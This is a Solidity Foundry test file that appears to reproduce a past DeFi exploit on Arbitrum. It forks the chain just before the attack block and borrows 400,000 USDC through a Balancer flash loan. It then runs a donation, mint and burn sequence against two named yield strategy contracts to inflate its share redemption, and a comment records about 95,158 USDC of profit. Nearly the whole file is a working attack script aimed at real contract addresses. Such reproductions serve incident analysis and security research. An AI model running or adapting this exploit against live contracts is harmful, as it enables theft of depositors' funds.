// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

import "@interface/IBalancer.sol";
import "@interface/IERC20.sol";
import "@interface/IWETH9.sol";

import "./IStrategy.sol";

contract YieldTest is Test {
    WETH9 WETH = WETH9(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
    IERC20 DAI = IERC20(0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1);
    IERC20 USDC = IERC20(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);
    IBalancerVault vault =
        IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);

    IStrategy YieldStrategy_1 =
        IStrategy(0x7012aF43F8a3c1141Ee4e955CC568Ad2af59C3fa);
    IStrategy YieldStrategy_2 =
        IStrategy(0x3b4FFD93CE5fCf97e61AA8275Ec241C76cC01a47);

    function setUp() public {
        vm.createSelectFork("arbitrum", 206_219_812 - 1);
    }

    function print(string memory _txt, uint256 value, uint256 decimal) public {
        emit log_named_decimal_uint(_txt, value, decimal);
    }

    function testExploit() public {
        address[] memory tokens = new address[](1);
        tokens[0] = address(USDC);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 400_000 * 1e6;

        vault.flashLoan(address(this), tokens, amounts, "");

        // 95_158.562521
        print("USDC Balance After exploit", USDC.balanceOf(address(this)), 6);
    }

    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory /* userData */
    ) external {
        USDC.transfer(address(YieldStrategy_1), 308_000 * 1e6);
        YieldStrategy_1.mintDivested(address(this));

        uint256 transferAmount = YieldStrategy_1.balanceOf(address(this)) / 2;
        YieldStrategy_1.transfer(address(YieldStrategy_2), transferAmount);
        YieldStrategy_2.mint(address(YieldStrategy_2)); // mint strategy token

        // donate pool token to strategy token vault
        YieldStrategy_1.transfer(
            address(YieldStrategy_2),
            YieldStrategy_1.balanceOf(address(this))
        );
        // burn strategy token to get pool token
        YieldStrategy_2.burn(address(this));

        YieldStrategy_2.mint(address(YieldStrategy_2)); // recover donated pool token
        YieldStrategy_2.burn(address(this));

        YieldStrategy_1.transfer(
            address(YieldStrategy_1),
            YieldStrategy_1.balanceOf(address(this))
        );
        YieldStrategy_1.burnDivested(address(this)); // burn pool token to USDC

        tokens[0].transfer(address(vault), amounts[0] + feeAmounts[0]);
    }
}
